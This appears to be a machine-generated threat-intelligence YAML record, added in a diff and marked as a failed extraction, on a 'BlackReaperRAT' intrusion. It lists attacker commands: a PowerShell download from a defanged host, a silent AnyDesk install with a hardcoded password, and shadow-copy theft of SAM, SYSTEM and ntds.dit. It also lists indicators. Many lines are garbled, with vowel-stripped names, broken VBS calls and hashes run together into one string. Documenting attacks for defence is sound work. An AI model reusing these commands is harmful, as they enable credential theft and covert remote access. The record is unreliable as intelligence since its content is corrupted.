@@ -1,0 +1,104 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T20:43:46.335580
+# Response length: 6705 chars
+# Input chunk preview: 'ecpol.inf" $newContent = @() $batchLogonUpdated = $false foreach ($line in $infContent) { if ($line -match "^SeBatchLogonRight\\s*=") { $newContent += "SeBatchLogonRight = *[SID  ]," + ($line -replace '
+# ============================================================
+
+title: "Forbidden Hyena Attack with New Trojan - BlackReaperRAT"
+description: The attack involves the use of a new trojan named BlackReaperRAT, which includes a reverse shell and performs various malicious activities including privilege escalation and data exfiltration.
+attribution: ""
+malware_families:
+  - BlackReaperRAT
+cves: []
+ttps:
+  processes:
+    - powershell.exe
+    - cmd.exe
+    - scdit.exe
+    - 4458.exe
+    - AnyDesk.exe
+  command_lines:
+    - "scdit /configure /db \"$env:TEMP\secpol.cfg\" /cfg \"$env:TEMP\secpol.inf\" /quiet"
+    - "iccls [FilePath] /inheritance:d | Out-Null"
+    - "iccls [FilePath] /remove:g \"Administrators\" \"Users\" \"INTERACTIVE\" \"SERVICE\" \"BATCH\" | Out-Null"
+    - "iccls [FilePath] /setowner $username | Out-Null"
+    - "iccls [FilePath] /grant:r \"NT AUTHORITY\SYSTEM:(OI)(CI)F\" | Out-Null"
+    - "iccls [FilePath] /grant:r \"${username}:(OI)(CI)F\" | Out-Null"
+    - "cmd.exe /c \"%Public%\Documents\nDsk.x\" --install \"C:\Program Files (x86)\AnyDesk\" --start-with-win --silent"
+    - "\"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --restart-service"
+    - "& \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --set-password P@ssw0rd123!"
+    - "cmd.exe /c 'echo P@ssw0rd123! | \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --set-password'"
+    - "\"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --restart-service"
+    - "cmd.exe /c \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --get-idntds.ps1"
+    - "cmd /c copy \"$($volume.DeviceObject)\windows\system32\config\sam\" $tempdir"
+    - "cmd /c copy \"$($volume.DeviceObject)\windows\system32\config\system\" $tempdir"
+    - "cmd /c copy \"$($volume.DeviceObject)\Windows\NTDS\ntds.dit\" $tempdir"
+  powershell:
+    - "$newContent = @()"
+    - "foreach ($line in $infContent) { if ($line -match \"^SeBatchLogonRight\\s*=\") { $newContent += \"SeBatchLogonRight = *[SID  ],\" + ($line -replace \"^SeBatchLogonRight\\s*=\\s*\", \"\") $batchLogonUpdated = $true } else { $newContent += $line } }"
+    - "if (-not $batchLogonUpdated) { $newContent += \"SeBatchLogonRight = *[SID  ]\" }"
+    - "$newContent | Out-File \"$env:TEMP\secpol.inf\" -Force -Encoding Unicode"
+    - "$clnt = Nw-bjct Sstm.Nt.WbClint"
+    - "$url = \"hxxp://dwnld.nydsk[.]com/nDsk.x\""
+    - "$file = \"%Public%\Documents\nDsk.x\""
+    - "$clnt.DwnldFil($url, $fil)"
+    - "cmd.exe /c \"%Public%\Documents\AnyDesk.exe\" --install \"C:\Program Files (x86)\AnyDesk\" --start-with-win --silent"
+    - "\"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --restart-service"
+    - "& \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --set-password P@ssw0rd123!"
+    - "cmd.exe /c 'echo P@ssw0rd123! | \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --set-password'"
+    - "\"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --restart-service"
+    - "cmd.exe /c \"C:\Program Files (x86)\AnyDesk\AnyDesk.exe\" --get-idntds.ps1"
+    - "$vss = (Get-Service -name VSS)"
+    - "if ($vss.Status -ne \"Running\") { $notrunning = 1; $vss.Start() }"
+    - "$tempdir = \"C:\Temp\""
+    - "if (!(Test-Path $tempdir)) { New-Item -ItemType Directory -Path $tempdir }"
+    - "$id = (gwmi -list win32_shdwcpy).Create(\"C:\\\", \"ClientAccessible\").ShdwID"
+    - "$volume = (gwmi win32_shdwcpy -filter \"ID='$id'\")"
+    - "cmd /c copy \"$($volume.DeviceObject)\windows\system32\config\sam\" $tempdir"
+    - "cmd /c copy \"$($volume.DeviceObject)\windows\system32\config\system\" $tempdir"
+    - "if (Test-Path -Path \"C:\Windows\NTDS\ntds.dit\") { cmd /c copy \"$($volume.DeviceObject)\Windows\NTDS\ntds.dit\" $tempdir }"
+    - "$volume.Delete(); if ($notrunning -eq 1) { $vss.Stop() }"
+  scripts:
+    - "Function sdfregtrhg()"
+    - "shell14354353 = CreateObject(\"WScript.Shell\")"
+    - "htapath = WScript.ScriptFullName"
+    - "shell14354353.Run \"cnd.exe /c ping 127.9.6.1 -n 2 > nul & del /F /Q \" & htaPath & TM, @, True"
+    - "window. close"
+    - "End Function"
+    - "On Error Resume Next"
+    - "Call Download(\"https:// vbs,\"C:\ProgranData\"&RandonString(14)&\" .vbs\")"
+    - "Call Download(\"http:// L \"document . pdf\")"
+    - "Call sdfregtrhg()"
+  registry_keys: []
+  image_loads:
+    - 4458.exe
+  network_connections:
+    - "4458.exe -> 193.233.48[.]98:4458"
+  file_activity:
+    - "$env:TEMP\secpol.inf"
+    - "$env:TEMP\secpol.cfg"
+    - "C:\Users\Public\.ssh_keys\id_rsa"
+    - "C:\Users\Public\.ssh_keys\id_rsa.pub"
+    - "%Public%\Documents\nDsk.x"
+    - "C:\Program Files (x86)\AnyDesk.exe"
+    - "C:\Temp\sam"
+    - "C:\Temp\system"
+    - "C:\Temp\ntds.dit"
+  persistence:
+    - "Registry Run key (HKCU) pointing to C:\EXAMPLEONLY-path\EXAMPLEONLY-file.exe"
+  process_relations: []
+iocs:
+  hashes:
+    - 4fbd2f5b4625fa46b5706748dbb15d3f58fbeda723fc644d0db9174a78cbade15df07f2b3ddae4b24d05926167a4a5968e2748efe744e4600f968be9abd293a21eb19f45b8b228785d6f9e3736de902b07422b1911790e36a3a1a7dd35ae0b069129f200ec9a89896005ee67457f57ff250f8ebef7ca1ccc75a1b8df42fe9b1919fd3337b21a78c86880a4eb47657a1cccd08f81e8196b19e508e8820d7ec74174056c6fe7d5670c41e56c2d00f27880cf47784caffde890ec3f79c0276c99b84ccd9e987f918500ddfc538d96b78ab4e6383b838e3e508311fd6ae815bd156f71eba7b77838fffb0754852a9335555468dd161f87eb5ce048bceeb4d66ba64f1e20360e439594eeb38782b6dbf8de1de214a0b0f657d6c83c6c7a150498d6f41b5a73cafa33d82e994e8928279a3b97b0c424422bf678284ee9877c00de2c48f3064e852a2dd178aeb950c914f42689bf075ccaddf881938c4f7ff6b418d0f43fed834849907bdb3ae5fbd6c7a17e67256edf1d2fde2f1473d8dc4dfccfe6e619eb63db7fa79fae746e1f2b4d3bc5c4fbd0e7a7a9e372e7345cddd6cb0020c1dd965684ec191206014e72b302492a5c6ccb285ff4afe4f39cf760f6dccfc129dd0983d7b298743ab90fd6b9eff7c24cffa33c2678d82e971a69eeb3fda0ca98c3dc5c64193f849ca5048d0e81ee1778ffc086087a20de1e09aef68a8bd560b27eb58ca2d1bcc354a1a722fb8025d88289e4ec3ecbf0d7d612b7b2d1ee2e26a301e0960c04097f73dbaaa45025370763ed26f488538c7195203dd3584d1458918f2d99c8f48c1e73c69666218fa7b791ed5ff7900ee66cf1ea24a711529971ef3e9d22280a28ec73b6e84550febb8425d9c660f9777e2e4d3b5baaedea263cbe507e8666c239397561c58609f7ea569c9c49ddbb900cd260e7e42b02d03cfd87b94fab0b5c5854055c28b8ab3ce2d579ec9f66140251be8209729464fa71755640fc5e5c4bc7ac0880dcf1635acd01c09dba0411ef7ac4f4cc0e309412aae348c0621954bd329b5cabe45e92b31053627c27fa40853beb2cce2734fa677ffd933e59379f585ebf0becb6b4e06d0fbbf806de28a4bb256e837b4555f1b424557150479953865b30775056441b10fdcb984126ba4f98af4f64756902a807b453e761a6878a3a864df7664b2729e9ae3b5448dcd1c087cbb36b6a7827d83061c127
+  ip_addresses:
+    - 193.233.48[.]98
+    - 2.59.163[.]169
+  domains:
+    - confluence.dada-tuda[.]ru
+    - dada-tuda[.]ru
+    - big-tree[.]ru
+  urls:
+    - hxxps://confluence.dada-tuda[.]ru/.w/wrgdfregrtgawreg.vbs
+    - hxxps://big-tree[.]ru/.ss/s.php
+    - hxxps://t[.]me/+QFbPfHfSq3E0N2M6
+authors: []
